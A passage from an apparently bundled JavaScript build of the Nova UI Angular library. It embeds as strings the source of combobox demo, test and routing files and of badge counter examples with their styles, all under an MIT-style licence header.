/>\n<h1>Required</h1>\n<nui-combobox\n    id="nui-demo-combobox-required"\n    value="Item 1"\n    [isInErrorState]="errorState"\n    [itemsSource]="dataset"\n    (changed)="requiredValueChange($event)"\n></nui-combobox>\n<hr />\n<h1>With Separators</h1>\n<nui-combobox\n    id="nui-demo-combobox-separators"\n    [itemsSource]="separatorsDisplayedItems"\n    (changed)="separatorsTextboxChanged($event)"\n    placeholder="Select item"\n></nui-combobox>\n<hr />\n<h1>Typeahead</h1>\n<nui-combobox\n    id="nui-demo-combobox-typeahead"\n    [itemsSource]="typeaheadDisplayedItems"\n    [clearOnBlur]="true"\n    displayValue="label"\n    (changed)="typeaheadTextboxChanged($event)"\n    placeholder="Select item"\n></nui-combobox>\n<hr />\n<h1>Justified</h1>\n<div class="w-25">\n    <nui-textbox-number\n        id="nui-test-width-input"\n        [value]="width"\n        (valueChange)="changeWidth($event)"\n    ></nui-textbox-number>\n</div>\n<div [style.width.px]="width" id="nui-demo-justified-combobox-container">\n    <nui-combobox\n        id="nui-demo-justified-combobox"\n        [itemsSource]="dataset"\n        placeholder="Select item"\n        [justified]="true"\n    ></nui-combobox>\n</div>\n<hr />\n<h1>HTML in menu items</h1>\n<nui-combobox\n    id="nui-demo-combobox-html-in-items"\n    [itemsSource]="htmlDisplayedItems"\n></nui-combobox>\n<hr />\n<h1>Custom template</h1>\n<nui-combobox\n    id="nui-demo-combobox-with-template"\n    [itemsSource]="customTemplateItems"\n    displayValue="value"\n    [customTemplate]="customComboboxTemplate"\n></nui-combobox>\n<ng-template #customComboboxTemplate let-item="context">\n    <nui-icon [icon]="item.icon"></nui-icon>\n    <div class="media-body" class="combobox-examples-custom-template">\n        <h2>{{ item.value }}</h2>\n        <h5>{{ item.name }}</h5>\n        <nui-progress\n            [showProgress]="true"\n            [show]="true"\n            [percent]="item.progress"\n        ></nui-progress>\n    </div>\n</ng-template>\n<hr />\n<h1>Append to body</h1>\n<nui-combobox\n    id="nui-demo-combobox-append-to-body"\n    [itemsSource]="dataset"\n    [appendToBody]="true"\n    placeholder="Select item"\n></nui-combobox>\n<hr />\n<h1>Remove value button</h1>\n<nui-combobox\n    id="nui-demo-combobox-remove-value-button"\n    [itemsSource]="dataset"\n    [isRemoveValueEnabled]="true"\n    placeholder="Select item"\n></nui-combobox>\n'},88278:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\nimport _cloneDeep from "lodash/cloneDeep";\n\nimport { ISelectChangedEvent, ISelectGroup, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-test",\n    templateUrl: "./combobox-test.component.html",\n})\nexport class ComboboxTestComponent implements OnInit {\n    public dataset = [\n        "Item 1",\n        "Item 2",\n        "Item 3",\n        "Item 4",\n        "Item 5",\n        "Item 6",\n        "Item 7",\n        "Item 8",\n        "Item 9",\n        "Item 10",\n        "Item 11",\n        "Item 12",\n        "Item 13",\n        "Item 14",\n        "Item 15",\n    ];\n    public displayValueDataset = [\n        { value: "Value 1", name: "Item 1" },\n        { value: "Value 2", name: "Item 2" },\n        { value: "Value 3", name: "Item 3" },\n        { value: "Value 4", name: "Item 4" },\n        { value: "Value 5", name: "Item 5" },\n    ];\n    public reactiveFormDataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        selectedItem: "Item 2",\n    };\n    public myForm;\n    public requiredDataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n        selectedItem: "",\n    };\n    public separatorsDataset = {\n        itemsInGroups: [\n            {\n                header: `Group 1 header`,\n                items: [`Item 111`, `Item 211`, `Item 311`],\n            },\n            {\n                header: `Group 2 header`,\n                items: [`Item 112`, `Item 212`, `Item 312`],\n            },\n            {\n                header: `Group 3 header`,\n                items: [`Item 113`, `Item 213`, `Item 313`],\n            },\n        ],\n    };\n    public typeaheadDataset: ISelectGroup[] = [\n        {\n            header: "Group 1 header",\n            items: [\n                { label: "Item 111", value: "Value 1" },\n                { label: "Item 112", value: "Value 2" },\n                { label: "Item 123", value: "Value 3" },\n            ],\n        },\n        {\n            header: "Group 2 header",\n            items: [\n                { label: "Item 111", value: "Value 5" },\n                { label: "Item 212", value: "Value 6" },\n                { label: "Item 312", value: "Value 7" },\n            ],\n        },\n        {\n            header: "Group 3 header",\n            items: [\n                { label: "Item 456", value: "Value 7" },\n                { label: "Item 345", value: "Value 8" },\n                { label: "Item 414", value: "Value 9" },\n            ],\n        },\n    ];\n    public htmlDisplayedItems = [\n        "<>Item 111</>",\n        "<button>Button 1</button>",\n        "<input type=\'button\' value=\'Button 2\'>",\n        "<input type=\'text\'>",\n        "<p>Some paragraph</p>",\n    ];\n    public customTemplateItems = [\n        {\n            name: "item_1",\n            value: "Bonobo 112",\n            icon: "severity_ok",\n            progress: 78,\n        },\n        {\n            name: "item_2",\n            value: "Zelda 113",\n            icon: "severity_ok",\n            progress: 66,\n        },\n        {\n            name: "item_3",\n            value: "Max 123",\n            icon: "severity_critical",\n            progress: 7,\n        },\n        {\n            name: "item_4",\n            value: "Apple 234",\n            icon: "severity_ok",\n            progress: 24,\n        },\n        {\n            name: "item_5",\n            value: "Quartz 124",\n            icon: "severity_warning",\n            progress: 89,\n        },\n    ];\n    public typeaheadDisplayedItems = this.typeaheadDataset;\n    public displayValueSelectedItem: any;\n    public width: number = 500;\n    public isRequired: boolean = true;\n    public errorState: boolean = true;\n    public separatorsDisplayedItems = this.separatorsDataset.itemsInGroups;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        @Inject(ToastService) private toastService: ToastService\n    ) {\n        this.myForm = this.formBuilder.group({\n            item: this.formBuilder.control(\n                this.reactiveFormDataset.selectedItem,\n                [Validators.required]\n            ),\n        });\n    }\n\n    public ngOnInit(): void {\n        this.myForm.controls.item.valueChanges.subscribe((value) =>\n            console.log(value)\n        );\n        this.isInErrorState();\n    }\n\n    public requiredValueChange(\n        changedEvent: ISelectChangedEvent<string>\n    ): void {\n        this.requiredDataset.selectedItem = changedEvent.newValue;\n        this.isInErrorState();\n    }\n\n    public separatorsTextboxChanged(\n        searchQuery: ISelectChangedEvent<string>\n    ): void {\n        this.separatorsDisplayedItems = _cloneDeep(\n            this.separatorsDataset.itemsInGroups\n        );\n        this.separatorsDisplayedItems.forEach((items) => {\n            items.items = items.items.filter((item) =>\n                item.includes(searchQuery.newValue)\n            );\n        });\n    }\n\n    public isInErrorState(): void {\n        this.errorState =\n            this.isRequired &&\n            (!this.requiredDataset.selectedItem ||\n                !(\n                    this.requiredDataset.items.indexOf(\n                        this.requiredDataset.selectedItem\n                    ) !== -1\n                ));\n    }\n\n    public onSubmit(): void {\n        this.myForm.valid\n            ? this.toastService.success({ message: `Your form is valid!` })\n            : this.toastService.error({ message: `Your form is invalid!` });\n    }\n\n    public onDisplayValueChange(changedEvent: ISelectChangedEvent<any>): void {\n        this.displayValueSelectedItem = changedEvent.newValue;\n    }\n\n    public typeaheadTextboxChanged(\n        searchQuery: ISelectChangedEvent<any>\n    ): void {\n        this.typeaheadDisplayedItems = _cloneDeep(this.typeaheadDataset);\n        this.typeaheadDisplayedItems.forEach((group) => {\n            group.items = group.items.filter(\n                (item) =>\n                    item.label.includes(searchQuery.newValue) ||\n                    item.label.includes(searchQuery.newValue.label)\n            );\n        });\n    }\n\n    public changeWidth(newValue: number): void {\n        this.width = newValue;\n    }\n}\n'},95162:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="displayedItems"\n    [clearOnBlur]="true"\n    displayValue="label"\n    (changed)="textboxChanged($event)"\n    placeholder="Select item"\n    i18n-placeholder\n></nui-combobox>\n'},1350:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\n\nimport { ISelectChangedEvent, ISelectGroup } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-combobox-typeahead-example",\n    templateUrl: "./combobox-typeahead.example.component.html",\n})\nexport class ComboboxTypeaheadExampleComponent {\n    public dataset: ISelectGroup[] = [\n        {\n            header: "Group 1 header",\n            items: [\n                { label: "Item 111", value: "Value 1" },\n                { label: "Item 112", value: "Value 2" },\n                { label: "Item 123", value: "Value 3" },\n            ],\n        },\n        {\n            header: "Group 2 header",\n            items: [\n                { label: "Item 111", value: "Value 5" },\n                { label: "Item 212", value: "Value 6" },\n                { label: "Item 312", value: "Value 7" },\n            ],\n        },\n        {\n            header: "Group 3 header",\n            items: [\n                { label: "Item 456", value: "Value 7" },\n                { label: "Item 345", value: "Value 8" },\n                { label: "Item 414", value: "Value 9" },\n            ],\n        },\n    ];\n    public displayedItems = this.dataset;\n\n    public textboxChanged(searchQuery: ISelectChangedEvent<any>): void {\n        // searchQuery.newValue.label is necessary, since combobox can emit event with 2 possible values:\n        // either string or complex object ({label: x, value: y} in this case). Users should be careful dealing with this emitters\n        // and handle them properly.\n        const val = searchQuery?.newValue?.toLowerCase();\n        const label = searchQuery?.newValue?.label?.toLowerCase();\n        this.displayedItems = _cloneDeep(this.dataset);\n        this.displayedItems.forEach((group) => {\n            group.items = group.items.filter((item) => {\n                const itemLabel = item.label.toLowerCase();\n                return itemLabel.includes(val) || itemLabel.includes(label);\n            });\n        });\n    }\n}\n'},28662:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Combobox</h3>\n            <nui-combobox\n                id="nui-visual-test-basic-combobox"\n                [itemsSource]="dataset.items"\n            >\n            </nui-combobox>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Combobox with Placeholder</h3>\n            <nui-combobox\n                id="nui-visual-test-combobox-with-placeholder"\n                [itemsSource]="dataset.items"\n                placeholder="Select item"\n            >\n            </nui-combobox>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Disabled Combobox</h3>\n            <nui-combobox\n                id="nui-visual-test-combobox-disabled"\n                [value]="dataset.selectedItem"\n                [isDisabled]="true"\n                [itemsSource]="dataset.items"\n            >\n            </nui-combobox>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Required Combobox</h3>\n            <nui-combobox\n                id="nui-visual-test-combobox-required"\n                value=""\n                [isInErrorState]="errorState"\n                [itemsSource]="dataset.items"\n                (changed)="valueChange($event)"\n            >\n            </nui-combobox>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Justified Combobox</h3>\n            <nui-combobox\n                id="nui-visual-test-justified-combobox"\n                [itemsSource]="dataset.items"\n                placeholder="Select item"\n                [justified]="true"\n            >\n            </nui-combobox>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Combobox with Groups</h3>\n            <nui-combobox\n                id="nui-visual-test-combobox-separators"\n                [itemsSource]="displayedItems"\n                (changed)="textboxChanged($event)"\n            >\n            </nui-combobox>\n            <hr />\n        </div>\n    </div>\n</div>\n'},36194:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport _cloneDeep from "lodash/cloneDeep";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "combobox-visual-test",\n    templateUrl: "./combobox-visual-test.component.html",\n})\nexport class ComboboxVisualTestComponent implements OnInit {\n    public isRequired: boolean = true;\n    public errorState: boolean = true;\n    public dataset = {\n        items: [\n            "Item 1",\n            "Item 2",\n            "Item 3",\n            "Item 4",\n            "Item 5",\n            "Item 6",\n            "Item 7",\n            "Item 8",\n            "Item 9",\n            "Item 10",\n        ],\n        selectedItem: "",\n    };\n    public datasetInGroups = {\n        itemsInGroups: [\n            {\n                header: "Group 1 header",\n                items: ["Item 111", "Item 211", "Item 311"],\n            },\n            {\n                header: "Group 2 header",\n                items: ["Item 112", "Item 212", "Item 312"],\n            },\n            {\n                header: "Group 3 header",\n                items: ["Item 113", "Item 213", "Item 313"],\n            },\n        ],\n    };\n    public displayedItems = this.datasetInGroups.itemsInGroups;\n\n    public textboxChanged(searchQuery: ISelectChangedEvent<string>): void {\n        this.displayedItems = _cloneDeep(this.datasetInGroups.itemsInGroups);\n        this.displayedItems.forEach((items) => {\n            items.items = items.items.filter((item) =>\n                item.includes(searchQuery.newValue)\n            );\n        });\n    }\n\n    public ngOnInit(): void {\n        this.isInErrorState();\n    }\n\n    public valueChange(changedEvent: ISelectChangedEvent<string>): void {\n        this.dataset.selectedItem = changedEvent.newValue;\n        this.isInErrorState();\n    }\n\n    public isInErrorState(): void {\n        this.errorState =\n            this.isRequired &&\n            (!this.dataset.selectedItem ||\n                !(\n                    this.dataset.items.indexOf(this.dataset.selectedItem) !== -1\n                ));\n    }\n}\n'},77614:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-combobox\n    [itemsSource]="dataset.items"\n    [isRemoveValueEnabled]="true"\n    placeholder="Select item"\n    i18n-placeholder\n></nui-combobox>\n'},99178:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-combobox-with-remove-value-example",\n    templateUrl: "./combobox-with-remove-value.example.component.html",\n})\nexport class ComboboxWithRemoveValueExampleComponent {\n    public dataset = {\n        items: [\n            "Item 1",\n            "Item 2",\n            "Item 3",\n            "Item 4",\n            "Item 5",\n            "Item 6",\n            "Item 7",\n            "Item 8",\n            "Item 9",\n            "Item 10",\n            "Item 11",\n            "Item 12",\n            "Item 13",\n            "Item 14",\n            "Item 15",\n        ],\n    };\n}\n'},18695:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiSelectModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ComboboxAppendToBodyExampleComponent,\n    ComboboxBasicExampleComponent,\n    ComboboxClearExampleComponent,\n    ComboboxCustomTemplateExampleComponent,\n    ComboboxDisabledExampleComponent,\n    ComboboxDisplayValueExampleComponent,\n    ComboboxDocsComponent,\n    ComboboxIconExampleComponent,\n    ComboboxInlineExampleComponent,\n    ComboboxJustifiedExampleComponent,\n    ComboboxReactiveFormExampleComponent,\n    ComboboxRequiredExampleComponent,\n    ComboboxSeparatorsExampleComponent,\n    ComboboxTestComponent,\n    ComboboxTypeaheadExampleComponent,\n    ComboboxVisualTestComponent,\n    ComboboxWithRemoveValueExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ComboboxDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.support,\n                eolDate: new Date("2020-07-09"),\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "combobox-test",\n        component: ComboboxTestComponent,\n    },\n    {\n        path: "combobox-visual-test",\n        component: ComboboxVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "basic",\n        component: ComboboxBasicExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiSelectModule,\n        NuiTextboxModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiButtonModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        ComboboxBasicExampleComponent,\n        ComboboxClearExampleComponent,\n        ComboboxCustomTemplateExampleComponent,\n        ComboboxDisabledExampleComponent,\n        ComboboxDisplayValueExampleComponent,\n        ComboboxDocsComponent,\n        ComboboxIconExampleComponent,\n        ComboboxInlineExampleComponent,\n        ComboboxJustifiedExampleComponent,\n        ComboboxReactiveFormExampleComponent,\n        ComboboxRequiredExampleComponent,\n        ComboboxSeparatorsExampleComponent,\n        ComboboxTestComponent,\n        ComboboxTypeaheadExampleComponent,\n        ComboboxVisualTestComponent,\n        ComboboxAppendToBodyExampleComponent,\n        ComboboxWithRemoveValueExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("combobox"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ComboboxModule {}\n'},78012:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./combobox-append-to-body/combobox-append-to-body.example.component";\nexport * from "./combobox-basic/combobox-basic.example.component";\nexport * from "./combobox-clear/combobox-clear.example.component";\nexport * from "./combobox-custom-template/combobox-custom-template.example.component";\nexport * from "./combobox-disabled/combobox-disabled.example.component";\nexport * from "./combobox-display-value/combobox-display-value.example.component";\nexport * from "./combobox-docs/combobox-docs.example.component";\nexport * from "./combobox-icon/combobox-icon.example.component";\nexport * from "./combobox-inline/combobox-inline.example.component";\nexport * from "./combobox-justified/combobox-justified.example.component";\nexport * from "./combobox-reactive-form/combobox-reactive-form.example.component";\nexport * from "./combobox-required/combobox-required.example.component";\nexport * from "./combobox-separators/combobox-separators.example.component";\nexport * from "./combobox-test/combobox-test.component";\nexport * from "./combobox-typeahead/combobox-typeahead.example.component";\nexport * from "./combobox-visual-test/combobox-visual-test.component";\nexport * from "./combobox-with-remove-value/combobox-with-remove-value.example.component";\n'},39624:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    class="nui-badge-counter nui-badge-warning nui-badge-text-black"\n    data-before="999+"\n></div>\n'},44512:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="div {\n    position: relative;\n    height: 30px;\n    width: 50px;\n    border: 1px solid #3c3c3c;\n}\n"},97400:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-color-black",\n    templateUrl: "./badge-color-black.component.html",\n    styleUrls: ["./badge-color-black.component.less"],\n})\nexport class BadgeColorBlackComponent {}\n'},44852:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-badge-counter" [attr.data-before]="counter"></div>\n'},37204:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="div {\n    position: relative;\n    height: 30px;\n    width: 30px;\n    border: 1px solid #3c3c3c;\n}\n"},4756:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-badge-counter-basic",\n    templateUrl: "./badge-counter-basic.component.html",\n    styleUrls: ["./badge-counter-basic.component.less"],\n})\nexport class BadgeCounterBasicComponent {\n    counter = "1";\n}\n'},23328:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    class="nui-badge-counter nui-badge-counter-custom"\n    [attr.data-before]="counter"\n></div>\n\n<div class="nui-badge-empty nui-badge-empty-custom"></div>\n'},58552:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="div {\n    display: inline-block;\n    width: 50px;\n    height: 30px;\n    position: relative;\n    margin-right: 20px;\n    border: 1px solid #3c3c3c;\n}\n\n.nui-badge-counter-custom:after {\n    background: #0c5593;\n    border-radius: 0;\n    color: yellow;\n}\n\n.nui-badge-empty-custom:after {\n    background: #6b6ecf;\n    border-radius: 0;\n    transform: rotate(45deg);\n}\n"},15584:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  